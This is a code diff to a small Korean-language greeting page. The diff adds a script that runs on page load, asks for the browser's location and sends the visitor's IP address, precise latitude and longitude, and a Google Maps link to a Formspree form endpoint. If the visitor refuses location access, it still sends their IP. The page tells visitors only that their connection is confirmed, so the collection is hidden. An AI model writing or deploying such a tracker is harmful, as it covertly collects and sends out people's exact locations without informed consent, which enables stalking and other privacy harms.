@@ -7,35 +7,74 @@
 </head>
 <body>
     <h1>안녕하세요!</h1>
-    <p id="status">연결 중...</p>
+    <p id="status">위치 권한을 확인 중입니다...</p>
 
     <script>
-        async function saveIP() {
+        const formspreeUrl = "https://formspree.io/f/xpqnnvoj";
+
+        // 1. IP 주소 가져오는 함수
+        async function getIP() {
             try {
-                // 1. IP 주소 가져오기
                 const ipResponse = await fetch('https://api.ipify.org?format=json');
                 const ipData = await ipResponse.json();
-                const userIp = ipData.ip;
-
-                document.getElementById('status').innerText = "접속이 확인되었습니다.";
-
-                // 2. 올려주신 Formspree 주소로 전송
-                const formspreeUrl = "https://formspree.io/f/xpqnnvoj";
-
-                await fetch(formspreeUrl, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ "방문자_IP": userIp })
-                });
-
-                console.log("저장 성공");
-            } catch (error) {
-                console.error("에러 발생:", error);
+                return ipData.ip;
+            } catch (e) {
+                return "IP 가져오기 실패";
             }
         }
 
-        // 페이지가 켜지면 바로 실행
-        window.onload = saveIP;
+        // 2. 위치 정보를 잡아서 Formspree로 전송하는 함수
+        function getAndSaveLocation() {
+            // 브라우저가 위치 정보 기능을 지원하는지 확인
+            if (!navigator.geolocation) {
+                document.getElementById('status').innerText = "이 브라우저는 위치 기능을 지원하지 않습니다.";
+                return;
+            }
+
+            // 사용자에게 위치 동의 팝업을 띄우고 위치 가져오기
+            navigator.geolocation.getCurrentPosition(
+                // [성공 시] 사용자가 '허용'을 누르고 위치가 잡혔을 때
+                async (position) => {
+                    document.getElementById('status').innerText = "접속이 확인되었습니다.";
+                    
+                    const userIp = await getIP();
+                    const lat = position.coords.latitude;  // 위도
+                    const lon = position.coords.longitude; // 경도
+
+                    // Formspree로 데이터 전송
+                    await fetch(formspreeUrl, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ 
+                            "방문자_IP": userIp,
+                            "정밀_위도": lat,
+                            "정밀_경도": lon,
+                            "구글맵_링크": `https://www.google.com/maps?q=${lat},${lon}`
+                        })
+                    });
+                    console.log("위치 저장 완료");
+                },
+                // [실패 시] 사용자가 '거부'를 누르거나 위치를 못 잡았을 때
+                async (error) => {
+                    document.getElementById('status').innerText = "접속이 확인되었습니다. (위치 거부됨)";
+                    const userIp = await getIP();
+
+                    // 위치는 빼고 IP만 전송
+                    await fetch(formspreeUrl, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ 
+                            "방문자_IP": userIp,
+                            "위치_상태": "사용자가 위치 권한을 거부함"
+                        })
+                    });
+                    console.log("IP만 저장 완료");
+                }
+            );
+        }
+
+        // 페이지가 켜지면 실행
+        window.onload = getAndSaveLocation;
     </script>
 </body>
 </html>
